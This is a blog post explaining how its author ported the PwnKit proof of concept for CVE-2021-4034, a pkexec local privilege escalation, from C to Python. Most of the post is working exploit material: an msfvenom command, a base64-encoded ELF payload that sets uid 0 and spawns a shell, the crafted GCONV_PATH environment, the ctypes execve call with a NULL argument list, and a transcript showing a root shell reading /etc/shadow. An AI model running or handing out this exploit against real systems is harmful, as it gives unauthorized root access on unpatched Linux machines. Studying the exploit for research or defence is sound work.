<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Converting a PoC for CVE-2021-4034 from C to Python | joe ammond (pugpug’s) stuff</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Converting a PoC for CVE-2021-4034 from C to Python" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="On 2022-01-25, Qualys dropped a 0-day local privilege escalation vulnerability in polkit’s pkexec that allowed a local user to escalate to root easily. blasty posted PoC code that evening. For my own learning and as an interesting exercise, I ported it to Python. The payload is generated with msfvenom, but the rest of the exploit code is pure Python. Due to limitations in Python’s os.execve() function, we do need to drop directly into the C library to call pkexec." />
<meta property="og:description" content="On 2022-01-25, Qualys dropped a 0-day local privilege escalation vulnerability in polkit’s pkexec that allowed a local user to escalate to root easily. blasty posted PoC code that evening. For my own learning and as an interesting exercise, I ported it to Python. The payload is generated with msfvenom, but the rest of the exploit code is pure Python. Due to limitations in Python’s os.execve() function, we do need to drop directly into the C library to call pkexec." />
<link rel="canonical" href="https://ammond.org/python/2022/01/26/CVE-2021-4034-in-Python.html" />
<meta property="og:url" content="https://ammond.org/python/2022/01/26/CVE-2021-4034-in-Python.html" />
<meta property="og:site_name" content="joe ammond (pugpug’s) stuff" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-01-26T13:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Converting a PoC for CVE-2021-4034 from C to Python" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"https://ammond.org/python/2022/01/26/CVE-2021-4034-in-Python.html"},"description":"On 2022-01-25, Qualys dropped a 0-day local privilege escalation vulnerability in polkit’s pkexec that allowed a local user to escalate to root easily. blasty posted PoC code that evening. For my own learning and as an interesting exercise, I ported it to Python. The payload is generated with msfvenom, but the rest of the exploit code is pure Python. Due to limitations in Python’s os.execve() function, we do need to drop directly into the C library to call pkexec.","@type":"BlogPosting","url":"https://ammond.org/python/2022/01/26/CVE-2021-4034-in-Python.html","headline":"Converting a PoC for CVE-2021-4034 from C to Python","dateModified":"2022-01-26T13:00:00-06:00","datePublished":"2022-01-26T13:00:00-06:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://ammond.org/feed.xml" title="joe ammond (pugpug's) stuff" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">joe ammond (pugpug&#39;s) stuff</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/writeups/SANS/">SANS Writeups</a><a class="page-link" href="/about/">About</a><a class="page-link" href="/writeups/">Writeups</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Converting a PoC for CVE-2021-4034 from C to Python</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2022-01-26T13:00:00-06:00" itemprop="datePublished">Jan 26, 2022
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>On 2022-01-25, <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">Qualys dropped a 0-day local privilege escalation
vulnerability</a>
in polkit’s <code class="language-plaintext highlighter-rouge">pkexec</code> that allowed a local user to escalate to <code class="language-plaintext highlighter-rouge">root</code> easily.
<a href="https://twitter.com/bl4sty">blasty</a> posted <a href="https://haxx.in/files/blasty-vs-pkexec.c">PoC code</a>
that evening. For my own learning and as an interesting exercise, I ported it
to Python. The payload is generated with <code class="language-plaintext highlighter-rouge">msfvenom</code>, but the rest of the exploit
code is pure Python. Due to limitations in Python’s <code class="language-plaintext highlighter-rouge">os.execve()</code> function, we
do need to drop directly into the C library to call <code class="language-plaintext highlighter-rouge">pkexec</code>.</p>

<p>The code is available <a href="https://github.com/joeammond/CVE-2021-4034">on my GitHub</a></p>

<h2 id="pythons-osexecve-function">Python’s <code class="language-plaintext highlighter-rouge">os.execve()</code> function</h2>

<p>One key factor in the exploit working is in how the Linux <code class="language-plaintext highlighter-rouge">execve()</code> call handles
when passed <code class="language-plaintext highlighter-rouge">argv=NULL</code> or <code class="language-plaintext highlighter-rouge">envp=NULL</code>. From <a href="https://man7.org/linux/man-pages/man2/execve.2.html#NOTES">https://man7.org/linux/man-pages/man2/execve.2.html#NOTES</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>On Linux, argv and envp can be specified as NULL.  In both cases,
this has the same effect as specifying the argument as a pointer
to a list containing a single null pointer.  Do not take
advantage of this nonstandard and nonportable misfeature!  On
many other UNIX systems, specifying argv as NULL will result in
an error (EFAULT).  Some other UNIX systems treat the envp==NULL
case the same as Linux.
</code></pre></div></div>

<p>The <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">Qualys writeup of the vulnerability</a>
details how calling <code class="language-plaintext highlighter-rouge">pkexec</code> with an argument list of <code class="language-plaintext highlighter-rouge">NULL</code> causes <code class="language-plaintext highlighter-rouge">pkexec</code> to
overwrite a portion of it’s environment, allowing an attacker to introduce 
an potentially insecure environment variable back into the process. Unfortunately,
Python’s <code class="language-plaintext highlighter-rouge">os.execve()</code> function doesn’t allow a process to be executed with an argument
list of <code class="language-plaintext highlighter-rouge">NULL</code>:</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">p5550$</span><span class="w"> </span>python
<span class="go">Python 3.10.2 (main, Jan 24 2022, 20:21:50) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span> import os
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> os.execve<span class="o">(</span><span class="s1">'/usr/bin/pkexec'</span>, None, os.environ<span class="o">)</span>
<span class="go">Traceback (most recent call last):
</span><span class="gp">  File "&lt;stdin&gt;</span><span class="s2">", line 1, in &lt;module&gt;
</span><span class="go">TypeError: execve: argv must be a tuple or list
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span>
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> os.execve<span class="o">(</span><span class="s1">'/usr/bin/pkexec'</span>, <span class="o">()</span>, os.environ<span class="o">)</span>
<span class="go">Traceback (most recent call last):
</span><span class="gp">  File "&lt;stdin&gt;</span><span class="s2">", line 1, in &lt;module&gt;
</span><span class="go">ValueError: execve: argv must not be empty
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span>
</code></pre></div></div>

<p>Attempting to call <code class="language-plaintext highlighter-rouge">execve()</code> with either an empty tuple or <code class="language-plaintext highlighter-rouge">Null</code> cause exceptions.</p>

<h2 id="the-exploit-code">The exploit code</h2>

<p>To facilitate using different payloads with the script, I used <code class="language-plaintext highlighter-rouge">msfvenom</code> to 
generate the shared library needed to perform the actual exploit. Using this path
allows an attacker to drop in different payloads depending on their needs at
the time. The default exploit calls <code class="language-plaintext highlighter-rouge">setuid(0)</code>, then spans <code class="language-plaintext highlighter-rouge">/bin/sh</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Payload, base64 encoded ELF shared object. Generate with:
#
# msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64
#
# The PrependSetuid=true is important, without it you'll just get
# a shell as the user and not root.
#
# Should work with any msfvenom payload, tested with linux/x64/exec
# and linux/x64/shell_reverse_tcp
</span>
<span class="n">payload_b64</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
'''</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">payload_b64</span><span class="p">)</span>
</code></pre></div></div>

<p>We also need the environment array to pass to <code class="language-plaintext highlighter-rouge">execve()</code>:
we start with a list of Python strings, then convert them into a C array of char*.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Set the environment for the call to execve()
</span><span class="n">environ</span> <span class="o">=</span> <span class="p">[</span>
        <span class="sa">b</span><span class="s">'exploit'</span><span class="p">,</span>
        <span class="sa">b</span><span class="s">'PATH=GCONV_PATH=.'</span><span class="p">,</span>
        <span class="sa">b</span><span class="s">'LC_MESSAGES=en_US.UTF-8'</span><span class="p">,</span>
        <span class="sa">b</span><span class="s">'XAUTHORITY=../LOL'</span><span class="p">,</span>
        <span class="bp">None</span>
<span class="p">]</span>

<span class="c1"># Convert the environment to an array of char*
</span><span class="n">environ_p</span> <span class="o">=</span> <span class="p">(</span><span class="n">c_char_p</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">environ</span><span class="p">))()</span>
<span class="n">environ_p</span><span class="p">[:]</span> <span class="o">=</span> <span class="n">environ</span>
</code></pre></div></div>

<p>To call <code class="language-plaintext highlighter-rouge">execve</code> directly, we open the C library using the <code class="language-plaintext highlighter-rouge">ctypes</code> <code class="language-plaintext highlighter-rouge">CDDL</code> function:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Find the C library to call execve() directly, as Python helpfully doesn't
# allow us to call execve() with no arguments.
</span><span class="k">try</span><span class="p">:</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="n">find_library</span><span class="p">(</span><span class="s">'c'</span><span class="p">))</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[!] Unable to find the C library, wtf?'</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>and call <code class="language-plaintext highlighter-rouge">execve</code> with a <code class="language-plaintext highlighter-rouge">NULL</code> argument list and the environment array we built earlier:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Call execve() with NULL arguments
</span><span class="n">libc</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="sa">b</span><span class="s">'/usr/bin/pkexec'</span><span class="p">,</span> <span class="n">c_char_p</span><span class="p">(</span><span class="bp">None</span><span class="p">),</span> <span class="n">environ_p</span><span class="p">)</span>
</code></pre></div></div>

<p>And we get a root shell:</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">p5550$</span><span class="w"> </span>python CVE-2021-4034.py
<span class="go">[+] Creating shared library for exploit code.
[+] Calling execve()
</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=1000(jra) groups=1000(jra),4(adm),27(sudo),119(lpadmin),998(lxd)
</span><span class="gp">#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">#</span><span class="w"> </span><span class="nb">head</span> /etc/shadow
<span class="go">root:*:18709:0:99999:7:::
daemon:*:18709:0:99999:7:::
bin:*:18709:0:99999:7:::
sys:*:18709:0:99999:7:::
sync:*:18709:0:99999:7:::
games:*:18709:0:99999:7:::
man:*:18709:0:99999:7:::
lp:*:18709:0:99999:7:::
mail:*:18709:0:99999:7:::
news:*:18709:0:99999:7:::
</span><span class="gp">#</span><span class="w">
</span></code></pre></div></div>

  </div><a class="u-url" href="/python/2022/01/26/CVE-2021-4034-in-Python.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">joe ammond (pugpug&#39;s) stuff</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">joe ammond (pugpug&#39;s) stuff</li><li><a class="u-email" href="mailto:joe@ammond.org">joe@ammond.org</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/joeammond"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">joeammond</span></a></li><li><a href="https://www.twitter.com/joeammond"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">joeammond</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>joe ammond&#39;s musings, write ups, Hack The Box walkthroughs, CTF info</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
